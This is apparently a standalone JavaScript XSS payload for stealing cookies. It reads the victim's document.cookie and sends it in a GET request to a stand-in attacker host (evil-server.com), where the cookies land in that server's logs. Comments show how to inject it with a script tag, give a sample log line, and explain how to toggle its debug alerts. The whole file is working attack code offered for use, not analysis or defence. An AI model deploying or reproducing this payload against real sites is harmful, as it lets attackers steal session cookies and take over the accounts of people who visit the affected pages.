// send a get request to the origin server of this javascript file to catch cookies from a target in the origin servers log files 
// Example log entry: "GET /stolen-cookies/session=20237098791872398723948920209;%20test=dummy HTTP/1.1" 404 -
// Use in XSS like: <script src="http://evil-server.com/xss-steal-cookies.js"></script>

//alert("js script loaded");
// define url to grab (including cookies)
var srv = "http://evil-server.com:80";
var url = srv+"/stolen-cookies/"+document.cookie;

// configure new get request
var xhr = new XMLHttpRequest();
xhr.open('GET', url);

// add code to execute after the get request, such as redirects, etc.
xhr.onload = function() {
	// window.location.replace("/);
};
//alert("get configured");

// issue request
xhr.send();
//alert("get sent");

// enable debugging in vim with [ESC] :%s/^\/\/alert/alert/g
// disable with [ESC] :%s/^alert/\/\/alert/g
